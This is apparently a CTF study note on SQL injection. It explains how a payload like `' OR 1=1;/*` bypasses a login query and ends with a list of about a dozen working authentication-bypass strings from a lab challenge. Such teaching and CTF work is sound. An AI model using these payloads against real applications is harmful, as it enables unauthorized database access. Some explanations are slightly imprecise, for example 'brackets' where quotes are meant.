SQL injection (SQLi) is a well-known web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. ([Source](https://portswigger.net/web-security/sql-injection))

This note may be expanded in future. Challenges that require SQLi:
* SQL Direct
* SQLiLite
* More SQLi

Let's assume that the application queries the database with the following SQL query:


```sql
SELECT * FROM users WHERE name='USERNAME' AND password='PASSWORD'
```


To dump all users, we will inject into the `name` field. To do this, our payload must meet the following conditions:



* close the `name` field: `name=' '`
* add a condition that always returns `true`
* truncate the rest of the query 

For the last condition, we need to know what comments or query endings look like in SQL:

```sql
#
--
/* */ (open close)
;%00	(nullbyte)
;     (end of query)
```

For example payload `' OR 1=1;/*`

`'`- закриває лапку для поля `name`, завершуючи порожній рядок

`OR 1=1` - додає умову, яка **завжди істинна**:



* `1=1` always equals `true`
* Because of the operator `OR`, even if `name=' '` is `false`, the entire expression becomes `true`. The operator assumes that if **ONE** condition of the expression is *true*, then the entire expression is *true*. ([Logical disjunction](https://en.wikipedia.org/wiki/Logical_disjunction))



![Logical disjunction schema](../assets/images/Logical%20disjunction.png)

* `--` - This is a comment in SQL that disables the rest of the query after it (comments it out). You can try the same thing with the end-of-query symbol `;`.



Let's insert the aforementioned payload:


```sql
SELECT * FROM users WHERE name='' OR 1=1;/*' AND password='PASSWORD'
```


 \
`/*` – Everything that follows this part will be considered a comment and will not be executed. Although `name='' ` is empty, the condition `OR 1=1 ` will force the entire expression to be *true*.

Taking into account the three rules above, you can construct injections yourself, which I did while completing the `SQLiLite` task: \
<pre class="prettyprint">
' OR 1=1 --";
' OR 1=1;--' 
' OR 1=1;--  
' OR 1=1;    
''' OR 1=1;  
''''' OR 1=1; # odd number in the payload required
' or true /*
' OR 1=1 /*
1' or 1 /* 
232435.11' or 12312.22 /* # every int/float/double number passes
' OR 1=1 --"
1' OR 12666;%00 # every int/float/double number passes
33' OR 1=1 -- </pre>




Let's look at some examples `''' OR 1=1;` and  `''''' OR 1=1;` :


```sql
SELECT * FROM users WHERE name='''' OR 1=1;--' AND password='PASSWORD'
```


Make sure that the payload starts with an odd number of brackets so that the last one is **closing** for the field.

